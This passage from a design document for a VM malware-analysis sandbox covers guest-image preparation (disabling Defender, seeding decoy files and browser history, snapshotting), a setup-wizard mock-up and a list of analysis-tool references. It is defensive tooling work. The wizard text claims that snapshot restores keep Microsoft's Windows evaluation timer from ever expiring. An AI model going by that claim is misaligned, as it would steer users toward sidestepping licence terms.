│  └── Disable Defender (would quarantine our samples)    │
│                                                          │
│  Phase 2 — Environment Setup (post-install script)      │
│  ├── Install Chrome (silent installer)                  │
│  ├── Install Office / LibreOffice                       │
│  ├── Install Adobe Reader, 7-Zip, Notepad++            │
│  ├── Populate desktop with 15-20 fake files            │
│  ├── Populate Chrome history + bookmarks                │
│  ├── Populate Recent Documents                          │
│  ├── Set 1920x1080 resolution                           │
│  ├── Set wallpaper to default Windows wallpaper         │
│  └── Create fake Outlook profile                        │
│                                                          │
│  Phase 3 — Golden Snapshot                              │
│  ├── Clean up installer artifacts                       │
│  ├── Defragment (smaller snapshot)                      │
│  ├── Take QEMU snapshot → "golden"                      │
│  └── Store snapshot hash for integrity verification     │
│                                                          │
│  Total time: ~15-20 minutes (one-time, fully automatic) │
└─────────────────────────────────────────────────────────┘
```

#### Setup Wizard UX

```
┌──────────────────────────────────────────────────────────┐
│  VM Sandbox Setup                                         │
│                                                           │
│  Available Guest Images:                                  │
│                                                           │
│  ✅ Alpine Linux 3.19          [Built-in]    Ready        │
│  ✅ ReactOS 0.4.15             [Built-in]    Ready        │
│                                                           │
│  ☐ Windows 10 Enterprise       [4.8 GB]     [Download]   │
│    Free 90-day evaluation from Microsoft                  │
│    Recommended for malware analysis                       │
│                                                           │
│  ☐ Windows 11 Enterprise       [5.2 GB]     [Download]   │
│    Free 90-day evaluation from Microsoft                  │
│                                                           │
│  ☐ Ubuntu 22.04 LTS            [1.2 GB]     [Download]   │
│    Free, open source                                      │
│                                                           │
│  ☐ Custom ISO                               [Import]     │
│    Bring your own Windows/Linux ISO                       │
│                                                           │
│  ─────────────────────────────────────────────────────── │
│  ℹ Windows evaluation images are provided free by         │
│    Microsoft for testing purposes. Each analysis restores │
│    from a clean snapshot — the evaluation timer never     │
│    expires.                                               │
└──────────────────────────────────────────────────────────┘
```

---

### References — VM Sandbox

- [DRAKVUF](https://drakvuf.com/) — Open-source VMI-based malware analysis (Tamas K Lengyel)
- [LibVMI](https://libvmi.com/) — Virtual Machine Introspection library
- [Apple Hypervisor.framework](https://developer.apple.com/documentation/hypervisor)
- [KVM API Documentation](https://www.kernel.org/doc/html/latest/virt/kvm/api.html)
- [Intel Processor Trace](https://www.intel.com/content/www/us/en/developer/articles/technical/processor-tracing.html)
- [VMRay Platform](https://www.vmray.com/) — Commercial hypervisor-based sandbox
- [CPUID Masking for Anti-Evasion](https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/shi)
- [proc_connector (CN_PROC)](https://lwn.net/Articles/157150/) — Linux kernel process events via netlink
